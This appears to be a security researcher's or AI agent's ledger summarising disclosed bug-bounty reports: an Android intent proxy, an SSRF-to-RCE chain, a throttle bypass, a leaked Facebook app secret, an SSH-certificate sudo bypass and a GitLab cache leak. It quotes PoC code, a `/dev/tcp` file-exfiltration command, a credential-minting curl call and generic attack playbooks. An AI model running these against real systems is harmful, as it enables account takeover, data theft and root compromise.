ROUTE: live `curl https://hackerone.com/reports/2552879.json` — HTTP 200 but `visibility: no-content`, `vulnerability_information` 0 B (body withheld by policy — not a rendering failure); `r.jina.ai` and the disclosed-reports mirror (ajaysenr/HackerOne-Disclosed-Reports reports/2552879.md) render metadata + the team summary only ("No vulnerability information available."). ROUTE THAT WORKED = the Wayback `.json` capture `20240709142051` (fetched `id_`-raw + gunzip) — `visibility: full` at capture time, `vulnerability_information` 3,202 B read IN FULL. Metadata: Basecamp, "Navgraph confusion allows any 3p app to send and read requests from the server at app.hey.com", weakness Deserialization of Untrusted Data, reporter `fr4via`, created 2024-06-15, disclosed 2024-07-09, state Closed / substate resolved; asset GOOGLE_PLAY_APP_ID `com.basecamp.hey` (HEY Email 1.21.0, versionCode 196, minSdk 29, targetSdk 34, sha256 8fe703c72b66691333d4a9c8b4843028c12de805a550983bfedabff7943ac94a); severity Team Medium 5.5 (`AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N`), 31 votes.
STATUS: UNVERIFIED (not reproduced — no Android device or HEY account touched this pass; knowledge intake only)
CLASS: mobile confused deputy / intent-driven authenticated request PROXY — the EXPORTED main activity routes a NOT-in-manifest custom scheme to every destination of the app's navigation graph, and a `deepLinkExtras` bundle carries an UNVALIDATED `location` URL: the logged-in victim app fetches it with the user's session and hands the downloaded response to whichever third-party app registered the file extension (arbitrary authenticated request SEND + response READ)
CORE METHOD:
  1. THE GAP (report, verbatim): "When the main activity receives an intent it routes it according to its data part. While the scheme `hey` is not registered in the Android manifest, it is still routed by the MainActivity (which is exported), exposing this way all the fragments that the \"hey\" deeplinks correspond to." — nav-graph confusion: a scheme that is NOT declared is still internally routed, so every fragment (including internal ones) is addressable by a 3p app through an explicit intent.
  2. THE ENTRY (report, verbatim): "In the particular case I exploited the deeplink of the `hey://fragment/openable_files` which the app routes to the `OpenableFilesFragment`. The `location` argument is given via the android-support-nav:controller:deepLinkExtras and since there is no validation the application proceeds to download the file from the `location` argument and route it according to the query parameter `proceed_to`."
  3. THE INTENT (report PoC, verbatim): `Bundle bundle = new android.os.Bundle(); bundle.putString("location",editText.getText().toString()+ "?proceed_to=file:///sdcard/Download/a.kkk"); Intent className = new android.content.Intent().setClassName("com.basecamp.hey", "com.basecamp.hey.main.MainActivity"); className.setData(Uri.parse("hey://fragment/openable_files")); className.putExtra("android-support-nav:controller:deepLinkExtras", bundle); className.setFlags(0x008000); startActivity(className);` — `location` = "the full url (including scheme and path) of the app.hey.com that you want to read" (fetched AUTHENTICATED = session riding).
  4. THE READ-BACK (report, verbatim): "My app subsequently registers an activity which handles the \"kkk\" file extension (which is unlikely to be handled by other apps). When basecamp downloads the file it creates an intent of action VIEW with the following data part: `content://com.basecamp.hey.turbo.fileprovider/shared/shared/whatever.kkk` Resulting on sending the reply back to my app." — `proceed_to=file:///sdcard/Download/a.kkk` routes the downloaded content to the attacker-registered extension handler through the app's FileProvider.
  5. INTERACTION (report, verbatim): "user interaction can be minimised to simply running the 3p app" — no victim click beyond installing/running the attacker app alongside the logged-in HEY app.
DETECTION SIGNAL: a single-activity Android app with a navigation graph where the main activity is EXPORTED and routes internal deeplink schemes (esp. schemes NOT declared in the manifest) to fragments; intent extras in the `android-support-nav:controller:deepLinkExtras` shape carrying URL arguments consumed with no validation; a fragment that downloads a caller-supplied `location` and routes the result per a `proceed_to`-style param; a FileProvider handing downloads to ACTION_VIEW (extension-based handler resolution). Tell: `adb shell am start` with `<scheme>://fragment/<name>` reaches fragments that have no exported entry of their own.
CHAIN: malicious 3p app co-installed with the logged-in victim app (precondition: same device; "user interaction can be minimised to simply running the 3p app") -> explicit intent to the exported MainActivity with `hey://fragment/openable_files` + unvalidated `location` (primitive: nav-graph confusion — an unregistered-but-routed scheme exposes ALL fragments) -> the victim app downloads ANY app.hey.com URL with the user's authenticated session (escalation: session-riding request proxy) -> the reply is written to `/sdcard/Download/a.kkk` and handed via `content://com.basecamp.hey.turbo.fileprovider/...` ACTION_VIEW to the attacker's registered `.kkk` handler (terminal per report: arbitrary authenticated request SEND + response READ = C:H — "this attack applies to any host that the user can authenticate through they hey app"; the reporter's own note: "The issue is identical to #1710541").
TRANSFERABLE TEST: on any Android app in scope: (1) manifest + `dumpsys package` -> list EXPORTED activities and every deeplink scheme; (2) for each exported activity fire `adb shell am start -n <pkg>/<activity> -d '<scheme>://fragment/<every nav-graph destination>'` including schemes NOT in the manifest, with a `deepLinkExtras`-style bundle carrying `location`/`url` pointing at your listener — a hit = the app fetched with the user's session; (3) register an activity for an exotic file extension (`kkk`) and aim the flow's `proceed_to`/save path at `<name>.kkk` — if the app's FileProvider ACTION_VIEWs the downloaded content to your handler, full response read is yours. Rule: **the navigation graph is an API — enumerate every exported activity's destination routing from OUTSIDE the app, and a bundle-carried URL the logged-in app fetches is session-riding unless validated.**
DEDUPE/DELTA: tokens `2552879`, `deepLinkExtras`, `openable_files`, `navgraph`, `turbo.fileprovider`, `1710541` = 0 hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: §17.363/#2553411 (SAME reporter, same disclosure day — a deeplink `filename` param traversed into `/sdcard` writes a victim document to shared storage; here the app FETCHES with the session and the RESPONSE is read back through an extension handler); §17.72/#1372667 (Basecamp `?proceed_to=` allowlist bypass -> WebView bridge bearer theft in com.basecamp.bc3 — a WebView/bridge chain; here no WebView: a nav-graph fragment performs an authenticated DOWNLOAD and a FileProvider hands it to a foreign handler); the Nextcloud Talk Android traversal-write entry (#1997029). NEW: nav-graph confusion via an unregistered-but-routed scheme + `deepLinkExtras` unvalidated URL = the app becomes a session-riding request proxy, response exfiltrated via an extension-registered handler. New general method -> §17.743.

No request sent to any target.

SOURCE: https://hackerone.com/reports/4170  2026-11-13
ROUTE: live `.json` = HTTP 404 (0 B) and the live page = 302 -> `/users/sign_in` (report no longer publicly reachable); browser tool on the same URL = Cloudflare "Just a moment..." wall at sign-in; `r.jina.ai` = 403 target_blocked. Wayback holds ONE capture only (`20240524013110`, 7,652 B) — a JS-disabled shell whose meta description carries H1's own summary (read IN FULL); no `.json` capture exists. ROUTE THAT WORKED for the technique = the credited public writeup: Nicolas Grégoire (Agarri), "Server-side browsing considered harmful", AppSec EU 2015 — https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf — OPENED and read IN FULL this pass (the "YMON saga" Parts 1-3). HONESTY FLAG: the deck cites no H1 report IDs; the attribution of #4170 to this deck is an INFERENCE from the exact match of program (Yahoo), service ("ymon") and technique (anti-loopback blacklist bypassed "through YQL and HTTP redirects" -> code execution) between the assigned title and the slides. H1's auto-summary (Wayback meta, verbatim): "A security vulnerability was discovered in Yahoo's \"ymon\" web service. An attacker bypassed the anti-loopback denylist by leveraging Yahoo Query Language (YQL) and HTTP redirects, ultimately achieving code execution. The vulnerability stemmed from the lack of proper input validation and sanitization in the \"ymon\" web service, allowing an attacker to execute arbitrary system commands."
STATUS: UNVERIFIED (not reproduced — knowledge intake only; the Yahoo infrastructure is long gone)
CLASS: RCE chain — SSRF denylist bypass (the denylist is checked BEFORE redirect following) -> reach the loopback-only monitoring web service -> `exec()` allowlisted to monitoring plugins but plugin ARGUMENTS unsanitized -> arbitrary file read/write -> privileged command execution
CORE METHOD:
  1. THE REACH (deck, verbatim bullets): "The YMON saga – Part 1: YQL (and Pipes) can access external systems / Existing blacklist (IP address + port) / Applied before following HTTP redirects" — the fetcher validates the INITIAL URL against the IP+port denylist, then follows redirects unchecked; a 302 from an allowlisted attacker host to `http://127.0.0.1:<port>/` lands on loopback (report title: "reached after bypassing the anti-loopback blacklist through YQL and HTTP redirects"). Part 1 alone was closed WONTFIX ("working as designed", $0).
  2. THE SURFACE (deck, verbatim): "Port TCP/9466 / 405 Method Not Allowed / WS using the ymon namespace / Google for \"ymon wsdl\" / Found ONE question from 2005"; "WSDL analysis / 450 lines, 11 methods / Including echo, exec, ping, version, ... / The exec() method / Looks sooooo interesting / But limited to some Nagios plugins" — a SOAP/RPC service only reachable on loopback, discovered via its WSDL; `exec()` is PLUGIN-ALLOWLISTED.
  3. THE ESCALATION (deck, verbatim): the allowlist covers the PLUGIN, not its ARGUMENTS — "Abuse the check_log plugin to leak files: `check_log -F /etc/* -O /dev/tcp/1.2.3.4/3333 -q ''`" (file exfil to attacker TCP via bash `/dev/tcp`) and "Abuse the check_log plugin to make a copy of bash: `check_log -F /bin/bash -O /home/y/libexec/nagios/check_nt -q ''`" then "Then execute bash with root privileges: `check_nt -c 'id;uname -a'`" (copy a shell over a to-be-executed binary = code execution; $15k).
  4. THE RE-BYPASS LADDER (deck, verbatim): "Hex encoding used to bypass both the IP and port checks / Access (again) the \"ymon\" WS on loopback / Execute code as \"y\" and not \"root\" anymore ... Fix for the IP check bypassed using octal encoding / Yes, that's the third bypass!" ($6,600) — each denylist fix is re-defeated by re-encoding the target (hex, then octal).
DETECTION SIGNAL: a URL-fetching feature behind an IP denylist that evaluates the list on the initial URL only (a redirect from your host to 127.0.0.1 reaches loopback); internal-only services on loopback high ports (monitoring/orchestration — ymon/Nagios/Consul/Monit) reachable through the fetcher; a WS/WSDL or RPC endpoint whose `exec`/`run`/`check` method is allowlisted to plugins/monitors while its parameters are free-form; `405` on GET but a SOAP POST works. Tell: the fetch lands on 127.0.0.1 and the response differs from the external fetch (the deck's "loopback idiosyncrasy").
CHAIN: any user of the target's own URL-fetching feature (deck: "YQL (and Pipes) can access external systems"; precondition: the feature is reachable and a denylist exists) -> 302-redirect to the loopback ymon WS (primitive: the denylist is "applied before following HTTP redirects") -> `exec()` with a plugin argument (`check_log -F <file> -O <attacker>/dev/tcp`, `-O <path>` copy) (escalation: plugin-arg injection — allowlisted exec, unallowlisted args) -> arbitrary file read (exfil to attacker) + write of a shell over `check_nt` -> "Then execute bash with root privileges" (terminal: RCE — H1 summary: "allowing an attacker to execute arbitrary system commands"; the hex/octal re-bypasses re-own the same WS at lower privilege and still execute code).
TRANSFERABLE TEST: on ANY server-side URL fetcher (upload-from-URL, RSS import, webhook tester, image proxy, export-to-URL): (1) host a 302/307 to `http://127.0.0.1:<ports>/` and diff the response against the same URL fetched directly — landing = denylist checked pre-redirect; (2) if the fetch reaches loopback, sweep monitoring/orchestration ports and pull any WSDL (`?wsdl`, `GET /` = 405, namespace grep); (3) on an `exec()`-shaped RPC inject through the plugin's ARGUMENTS, not its name: `-F /etc/* -O /dev/tcp/<you>/3333 -q ''`-style flag abuse (read), `-O <path>` copy (write) then execute the copy; (4) when a denylist fix lands, retry with re-encoded targets (`0x7f000001`, `0177.0.0.1`, `127.1`, `[::1]`, `0.0.0.0`) and 307 vs 302. Rule: **a denylist that validates the initial URL is not a redirect-time control, and an `exec()` allowlisted to plugins is not a command boundary — the plugin's arguments are the payload.** (Generic denylist-bypass shapes are already in the ssrf playbook V-04 / references/variants-1.md; the NEW atom here is the loopback-WS plugin-argument escalation.)
DEDUPE/DELTA: tokens `ymon`, `check_log`, `9466`, `Grégoire`, `anti-loopback`, `4170` = 0 hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: the ssrf playbook V-04 "DNS rebinding / redirect bypass" + `references/variants-1.md` (decimal/octal/IPv6 encodings — the DENYLIST-BYPASS half is already recorded; this entry contributes the LOOPBACK-WS-ESCALATION half and the re-encode-after-fix ladder); §2.1/#3165242 (Lichess url-param FETCH primitive only); §17.730 (document-ingest fetch+parse+render). NEW: plugin-allowlisted `exec()` on a loopback-only monitoring WS -> plugin-ARGUMENT injection (file read/write/exec) = SSRF-to-RCE. New general method -> §17.744.
FRESHNESS: old material — no date is visible on any reachable route for #4170 (H1 ID-era 2014-2015) and the credited deck is 2015-05 — FAR OUTSIDE the preferred 6-12 month window — recorded as BACKFILL, flagged; read because assigned. The general shapes (denylist pre-redirect; plugin-arg escalation; re-encode ladder) remain re-detectable.
HONESTY: not reproduced (knowledge intake only; nothing sent to any target). The report body was UNREADABLE on every direct route (live `.json` 404, page 302->sign-in, browser Cloudflare wall, r.jina.ai 403, Wayback = JS shell with H1's auto-summary only). Every quote above is verbatim from the material actually opened this pass: the H1 auto-summary (Wayback meta) and the Agarri AppSec EU 2015 PDF (read IN FULL). The #4170 <-> YMON-saga link is labelled INFERENCE (the deck never cites report numbers).

SOURCE: https://hackerone.com/reports/2230915  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/2230915.json` — HTTP 200, `visibility: full`, `vulnerability_information` 1,839 B read IN FULL (FIRST route worked). Metadata: Nextcloud, "Bruteforce protection in password verification can be bypassed", weakness Improper Restriction of Authentication Attempts, reporter `taise`, created 2023-10-29, disclosed 2024-01-17, state Closed / substate resolved; asset `nextcloud/server`; severity Team Medium 5.3 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`).
STATUS: UNVERIFIED (not reproduced — no Nextcloud instance stood up this pass; knowledge intake only)
CLASS: authentication bypass (first link of an ATO chain) — the login-attempt THROTTLE keys on `getRemoteAddress()`, which resolves the client identity from `X-Forwarded-For` whenever `trusted_proxies` matches -> the attacker rotates the header per request, the counter never accumulates, unlimited password guessing
CORE METHOD:
  1. THE KEY (report, verbatim): the bruteforce protection is "IP address-based blocking"; "The source IP address is obtained through the getRemoteAddress() function" — `lib/public/IRequest.php` (report's excerpt): `if (\is_array($trustedProxies) && $this->isTrustedProxy($trustedProxies, $remoteAddress))` then it iterates `forwarded_for_headers` (`HTTP_X_FORWARDED_FOR` by default) and returns the first entry passing `filter_var($IP, FILTER_VALIDATE_IP)`. "It is determined that the IP address is retrieved based on the value of the X-Forwarded-For header when trusted_proxy is configured."
  2. THE BYPASS (report, verbatim): "By adding the X-Forwarded-For header with valid ip format it is possible to bypass Bruteforce protection."
  3. THE REPRO (report, verbatim): "1. Setting up a nextcloud server using trusted_proxy. 2. Attempts to log in multiple times with incorrect passwords. Confirm that the `Throttler\sleepDelay` function causes a delay in response time. 3. Add `X-Forwarded-For` header with valid ip format, the the delay is eliminated and Bruteforce protection is bypassed." — one fresh valid IP per request = a fresh throttle key per request (the report's own typo preserved).
  4. THE IMPACT (report, verbatim): "an attacker can bypass bruteforce protection and bruteforce the login."
DETECTION SIGNAL: a login/OTP/reset endpoint whose attempt limit or delay (`sleepDelay`, `Retry-After`, 429) is keyed on the CLIENT IP; a deployment behind a proxy with forwarded-header trust configured (Nextcloud `trusted_proxies`, or any product's XFF/X-Real-IP/CF-Connecting-IP/True-Client-IP trust); a delay/limit that DISAPPEARS when the client-supplied forward header changes. Tell: the same request with a rotated `X-Forwarded-For` stops triggering `sleepDelay`.
CHAIN: unauthenticated attacker facing a password login (precondition: the deployment trusts a forwarded-for header — Nextcloud `trusted_proxies`; PR:N, no interaction) -> rotate `X-Forwarded-For: <valid IP>` per attempt (primitive: the throttle key is client-assertable) -> `Throttler\sleepDelay` eliminated, no lockout (the report's demonstrated effect) -> unlimited password guessing against any account (escalation: credential compromise — the report's own impact "bruteforce the login") -> a valid credential returns a full account session = ATO (terminal: on Nextcloud the account holds files, mail, calendar, contacts; this entry is the FIRST LINK of that chain — the guessing itself is the documented impact; per doctrine §2(c)/§2(d) the guess sweep runs only with explicit authorization, and the finding is proven by the delay disappearing).
TRANSFERABLE TEST: on any login/OTP/reset endpoint: (1) fire attempts until the delay/limit appears; (2) replay with a different `X-Forwarded-For: 1.2.3.<rand>` (also `X-Real-IP`, `Forwarded: for=...`, `CF-Connecting-IP`, `True-Client-IP`) per request; (3) if the delay vanishes per fresh value, the throttle key is client-controlled; (4) test both direct-to-origin and through the front door (forwarded headers are only honored behind trusted proxies). Rule: **the throttle identity must be server-derived (TCP peer) — if the counter keys on a forwarded header the client asserts, every attempt is a new client and the control is gone.**
DEDUPE/DELTA: tokens `2230915`, `taise`, `Throttler`, `sleepDelay`, `getRemoteAddress`, `trusted_proxies` = 0 hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: ledger #1363672 (Shopify — the attempt counter keys on the RAW identifier while auth normalizes it; here the counter keys on the CLIENT IDENTITY, which the client asserts via a proxy header); the checklist "IP-allowlist auth → spoof `X-Forwarded-For`" (bugbountyhuntingskills.md ~636 — an ACL bypass; here the target control is the ATTEMPT THROTTLE and the precondition is the product's own `trusted_proxies` config); W-E "three rate-limit classes". DELTA: identity-key rotation vs identifier-representation mutation. No §17 slot (carrier-level delta of the recorded throttle-defeat family).
FRESHNESS: created 2023-10-29, disclosed 2024-01-17 — OUTSIDE the preferred 6-12 month window (~22 months) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (no Nextcloud instance; no request sent to any target). Every quote above is verbatim from the live `.json` `vulnerability_information` read IN FULL this pass (1,839 B), including the `IRequest.php` excerpt exactly as the report reproduces it.

CORE METHOD:
  1. THE CARRIER (report, verbatim): "GlassWire version 1,1,26,0b (F1827380) contains Facebook App API credentials (https://developers.facebook.com/docs/facebook-login/guides/access-tokens?locale=en_US#apptokens) in the GlassWire.exe file. App ID: `660471650708388` App Secret: `71a2d003a5ecfab4f4ad86dfb70b74e0`" — an app-id + app-secret PAIR ships inside the compiled desktop binary (title says "leaked in the APK"; the body's artifact is `GlassWire.exe` — recorded as the report states it).
  2. THE MINT (report, verbatim): `curl "https://graph.facebook.com/oauth/access_token?client_id=660471650708388&client_secret=71a2d003a5ecfab4f4ad86dfb70b74e0&redirect_uri=&grant_type=client_credentials"` -> `{"access_token":"660471650708388|jboBZgqj64W1JXIAKIbtVz24FlQ","token_type":"bearer"}` ("To check that token is work run:" — the report's own wording). KEY POINT: the leaked SECRET is not a bearer credential; the provider's token endpoint converts it into a working `appID|token` Application Access Token — this MINT step is exactly what the recorded §17.410 replay-based test does not cover.
  3. THE IMPACT (report, verbatim): "This token can be used to modify Facebook App settings." — and the report's own authority for the boundary, quoted from the Facebook docs: "Note that because this request uses your app secret, it must never be made in client-side code or in an app binary that could be decompiled. It is important that your app secret is never shared with anyone. Therefore, this API call should only be made using server-side code."
DETECTION SIGNAL: a shipped client artifact (desktop binary via `strings`/decompile, APK via jadx/apktool, IPA, `.asar`, JS bundle, source map) containing a provider credential PAIR — an app/client id plus a secret (`client_id`+`client_secret`, `appID`+32-hex secret, `key|secret`); a provider token endpoint accepting `grant_type=client_credentials` that mints a bearer from that pair; the minted token in the app-token shape `appID|<token with special chars>`. TELL: the minted token passes a non-destructive admin call (e.g. `graph.facebook.com/app/roles`) or a settings read — the string did NOT work as a bearer until minted.
CHAIN: anyone holding the shipped binary (primitive: the app secret ships in a decompilable artifact — the provider's own doc, quoted in the report: the secret "must never be ... in an app binary that could be decompiled") -> `client_credentials` grant mints an Application Access Token (escalation: static secret -> live bearer) -> "This token can be used to modify Facebook App settings" (terminal: write access to the vendor's app registration = third-party app takeover; program rated Medium; the report does not enumerate which settings are writable).
TRANSFERABLE TEST: on every in-scope mobile/desktop/web client artifact: (1) `strings -n 8` / jadx / `asar extract` / source-map dump and grep for provider credential pairs (the recorded §9.x hunt list: `client_secret`, `app secret`, 32-hex, `AIza`, `AKIA`, `ghp_`, `sk_live_`); (2) for every pair, run the provider's own credential->token exchange — `graph.facebook.com/oauth/access_token?...&grant_type=client_credentials` for FB app secrets, `POST /oauth/token` `grant_type=client_credentials` for OAuth clients — do NOT stop at replaying the raw string as a bearer: a SECRET must be MINTED; (3) prove impact with the least-destructive admin call (`/app/roles`, app-settings read) and cite the provider's own docs for what the minted token can WRITE. Rule: **a client_secret in a binary is an app-takeover primitive the moment the provider will mint a token from it — the mint request is both the proof and the payload.**

SOURCE: https://hackerone.com/reports/1177356  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/1177356.json` — HTTP 200 but `visibility: no-content`, `vulnerability_information` 0 B (body withheld); local HuggingFace parquet mirrors (`/tmp/h1_reports.parquet`, `/tmp/h1_train.parquet`) = same `no-content`, VI 0; Wayback `.json` capture `20260531122709` fetched and gunzipped = `no-content`, VI 0, ONE team summary; Wayback HTML captures `20250328102931` + `20260717060835` (JS shells) whose `og:description` carries that team summary; `r.jina.ai` = 401 blocked; `web_extract` = upstream 403/timeout; ajaysenr mirror `reports/1177356.md` = metadata + Program Summary + "*No vulnerability information available.*". ROUTE THAT WORKED for the technique = the credited public artifact the team summary itself links: https://github.com/uber/pam-ussh — fix commit `6ddcbd4d04` "Verify the certificate is signed by the correct root CA." (2021-06-15) WITH its regression test `TestWithWrongCA`, read IN FULL this pass via the GitHub commits/commit API, plus the (fixed) master `pam_ussh.go` and README. HONESTY FLAG: the report<->commit attribution is an INFERENCE from the exact match of defect text and timing (submitted 2021-04-27, commit 2021-06-15, disclosed 2021-07-21, Resolved); the commit + regression test are first-hand evidence of the technique regardless of that link. Team summary, verbatim (Wayback `og:description` x2 + the gunzipped capture's `summaries[0]`): "The pam_ussh module that Uber open-sourced in https://github.com/uber/pam-ussh does not validate that the SSH certificate presented by a user is actually signed by a trusted CA listed in the configured ca_file." Public metadata (ajaysenr mirror): Uber, Medium CVSS 6.0, 31 votes, reporter `penguinsaretasty`, weakness Improper Authentication - Generic.
STATUS: UNVERIFIED (not reproduced — knowledge intake only; the module was not compiled and no request was sent to any target)
CLASS: authentication bypass -> local privilege escalation — an SSH-certificate PAM gate verifies only the certificate's SELF-consistency (signature against the CA key EMBEDDED in the certificate) and never anchors the ISSUER to the configured `ca_file` trust list, so a certificate minted by ANY attacker-controlled CA authenticates (trust-anchor pin missing, CWE-295 shape in SSH-cert flavor)
CORE METHOD:
  1. THE GATE (current master `pam_ussh.go`, read this pass): `authenticate()` connects to `$SSH_AUTH_SOCK`, `a.List()`s the agent keys, reads `ca_file` into `caPubkeys`, builds `c := &ssh.CertChecker{IsUserAuthority: <true iff cert.SignatureKey marshals equal to a caPubkeys entry>}`, then for each key: `ssh.ParsePublicKey` -> cast `*ssh.Certificate` -> `c.CheckCert(username, cert)` -> agent nonce-sign proof (`a.Sign(pubKey, randBytes)` + `pubKey.Verify`) -> principal match against `authorized_principals`/`authorized_principals_file` -> `AuthSuccess`.
  2. THE MISSING LINK (fix commit `6ddcbd4d04`, patch verbatim): `if !c.IsUserAuthority(cert.SignatureKey) { pamLog("certificate signed by unrecognized authority"); continue }` was ADDED after the `CheckCert` call — before the fix, `cert.SignatureKey` (the CA key EMBEDDED in the certificate) was never compared to the configured `ca_file` keys. `CheckCert` proves only that the cert is internally consistent (signed by its own `SignatureKey`) and valid for the username/principals/window — consistency is not trust.
  3. THE EXPLOIT (the fix's own regression test `TestWithWrongCA`, patch verbatim): "The correct CA is written to file for the pamAuthenticate function" (`correctCAKey` -> `ca_file`) while "The wrong CA is just used for signing the certificate" (`wrongCAKey` -> `wrongSigner`); `c := signedCert(userPub, wrongSigner, "foober", []string{"group:foober"})`; `a.Add(agent.AddedKey{PrivateKey: userPriv, Certificate: c})`; `r := pamAuthenticate(new(bytes.Buffer), getUID(), "foober", []string{caPamOpt})` — the assertion text records the pre-fix behavior: `require.Equal(t, AuthError, r, "authenticate succeeded when it should have failed")`.
  4. THE IMPACT: the self-minted certificate carries the principal the operator configured (e.g. the sudo principal in `authorized_principals_file`), so attacker CA + attacker key in the forwarded agent = `AuthSuccess` = sudo/root on every host gating sudo through pam_ussh (the module's own README, read this pass: "This is primarily intended as an authentication module for sudo").
DETECTION SIGNAL: any SSH/JWT/X.509/cert-based auth gate that checks EXPIRY, PRINCIPALS and SIGNATURE but never compares the certificate's ISSUER (`cert.SignatureKey` / `issuer` / `iss`) against the configured trust list; a PAM module whose success path proves only "the agent holds the private key for a self-consistent cert". Tell: a certificate signed by a throwaway key you generated is accepted exactly like a CA-signed one.
CHAIN: a user who can invoke the gated action and load keys into their ssh-agent (precondition: `SSH_AUTH_SOCK` — e.g. `ssh -A` agent forwarding; no victim interaction) -> mint a user certificate with an ATTACKER-OWNED CA carrying the required principal (`ssh-keygen -s wrong_ca -n <principal> -I x user.pub`) (primitive: an untrusted issuer is accepted) -> `CheckCert` passes on self-consistency + agent nonce-sign proves key possession + principal matches (escalation: the gate's whole checklist is satisfied without the configured CA ever signing anything) -> `AuthSuccess` -> sudo/root (terminal: root privilege escalation on every pam_ussh sudo host; H1 team rated Medium 6.0 — the sudo gate is the impact amplifier; per doctrine §8: precondition = local/agent-forwarded access, gain = root).
TRANSFERABLE TEST: on any certificate-based gate: (1) `ssh-keygen -t rsa -f wrong_ca` (throwaway CA), `ssh-keygen -t rsa -f user`, `ssh-keygen -s wrong_ca -n <the-principal-the-config-wants> -I x user.pub`; (2) `ssh-add user` (the agent holds key + wrong-CA cert; forward via `SSH_AUTH_SOCK`); (3) attempt the gated action (`sudo -k; sudo id`) on a host whose `pam_ussh.so ca_file=<real trusted CA>` — success = the issuer is not anchored. Source-available variant: grep the verify path for a comparison of `cert.SignatureKey` (or `issuer`) against the configured CA list — its ABSENCE is the bug (`CheckCert` alone is not a trust check). Rule: **a certificate that verifies against the CA key embedded inside it is self-consistent, not trusted — trust is ONLY the issuer-anchor comparison against the configured CA list, and that is exactly the check that goes missing.**
DEDUPE/DELTA: tokens `1177356`, `pam_ussh`, `pam-ussh`, `penguinsaretasty`, `IsUserAuthority`, `SignatureKey`, `CheckCert`, `TestWithWrongCA`, `6ddcbd4` = 0 hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: §17.176 (ID4me/OIDC `id_token` — the SIGNATURE is never verified at all and the ISSUER is attacker-chosen; here the signature IS verified, but against the attacker's own embedded key — the missing step is the trust-ANCHOR pin); §17.683 (EKS `eic_curl_authorized_keys` "self-referential trust anchor" — keys fetched from a metadata service that vouches for itself; cousin concept, different carrier); the JWT/`kid` families (playbook §11.1/§11.2 — key-CONFUSION, not key-TRUST-ANCHOR). NEW: an SSH-cert gate accepting certificates signed by unanchored CAs because only self-consistency was checked. New general method -> §17.745.
FRESHNESS: submitted 2021-04-27, disclosed 2021-07-21 — OUTSIDE the preferred 6-12 month window (~5.3 years) — recorded as BACKFILL, flagged; read because assigned. The general shape (self-consistency ≠ trust; anchor the issuer) is stack-level and re-detectable on every cert-auth gate.
HONESTY: not reproduced (knowledge intake only; nothing sent to any target; the module was not built). Every quote above is verbatim from the material actually opened this pass: the H1 team summary (Wayback `og:description` x2 + the gunzipped Wayback `.json` capture `20260531122709` `summaries[0]`), the ajaysenr mirror metadata, the uber/pam-ussh fix commit `6ddcbd4d04` patch + `TestWithWrongCA` (GitHub API), and the current master `pam_ussh.go` / README. The report BODY is withheld on EVERY route — the technique comes from the credited repo artifact; the report<->commit link is labelled INFERENCE.

SOURCE: https://hackerone.com/reports/1043480  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/1043480.json` — HTTP 200, `visibility: full`, `vulnerability_information` 4,608 B read IN FULL (FIRST route worked). Metadata: GitLab, "Remote hacker can download all the files of master branch in public projects where everything is members only.", weakness Improper Authentication - Generic, reporter `anshraj_srivastava`, created 2020-11-25, disclosed 2021-02-15, state Closed / substate resolved.
STATUS: UNVERIFIED (not reproduced — no GitLab instance stood up this pass; knowledge intake only)
CLASS: authentication bypass / BAC — a branch-archive download URL for a members-only project is trivially constructible; after an AUTHORIZED user's request, the same URL serves the archive to UNAUTHENTICATED clients "for a few moments" (the report does not name the internal mechanism; a shared cache keyed on URL alone is the evident shape — recorded as the report's observed behavior, not as a report claim)
CORE METHOD:
  1. THE CONSTRUCTIBLE URL (report verbatim): "The link to download files is like this - https://gitlab.com/photographyknavel/my-private-proj-3/-/archive/master/my-private-proj-3-master.zip and it can be easily constructed." — `<project>/-/archive/<branch>/<name>-<branch>.zip` needs no secret.
  2. THE WINDOW (report verbatim): "an unauthenticated user will not be able to download the files through the link, he would be shown an error message" (verified in an incognito tab) — "however, the weird behavior is that if the admin or someone with the permission to download the files of the branch, clicks on the link, then for a few moments afterward, anyone on the internet can download the file through the link." Cross-client proof (report verbatim): "To confirm this bug, you can try opening the link on another device too, make sure you do it right after clicking the link from the admin account-" ("This video is from my iPad, which was on a completely different network and the Gitlab account wasn't related to the project at all").
  3. THE AUTOMATION (report verbatim): "I use a web automation software like Selenium IDE" — "I can program a script to refresh this page ... so if the victim ever clicks the download button, I will be able to download the file since the page is being refreshed frequently and the script will stop if the link is executed." Selenium script core (verbatim): `"command": "times", "target": "9999"` looping `"command": "open", "target": "<the .zip URL>"` — a persistent unauthenticated poller that converts a "few moments" window into a reliable win ("Do change the URL of the target ... to the URL of the project you are targeting").
  4. THE IMPACT (report verbatim): "access files stored in a branch even though he's not authorized to do so, this leads to a data leak." (report title: "download all the files of master branch in public projects where everything is members only").
DETECTION SIGNAL: any "download / export / archive / raw-file" endpoint whose URL is predictable from project+branch+filename and whose content is authorization-gated; a request by a PERMITTED user changing what an UNAUTHENTICATED request to the SAME URL receives. Tell: unauth GET = error/302; a permitted user clicks once; the SAME unauth GET (different network, no cookies) now returns bytes for a few minutes.
CHAIN: any remote unauthenticated user who knows/guesses the project path (primitive: constructible URL, no secret) -> an authorized member's LEGITIMATE click of the link (precondition: a member downloads their own branch archive — normal use, no exploit interaction) -> "for a few moments afterward, anyone on the internet can download the file" (primitive: the authz result/response is shared across clients for that URL) -> an unauthenticated polling loop (the report's Selenium `times 9999` + `open <zip>`, or a `curl` loop) wins the window without timing skill (escalation: no race competence needed) -> the full branch archive (source tree = credentials/internal code; terminal per report: unauthorized access to members-only repository files = "data leak").
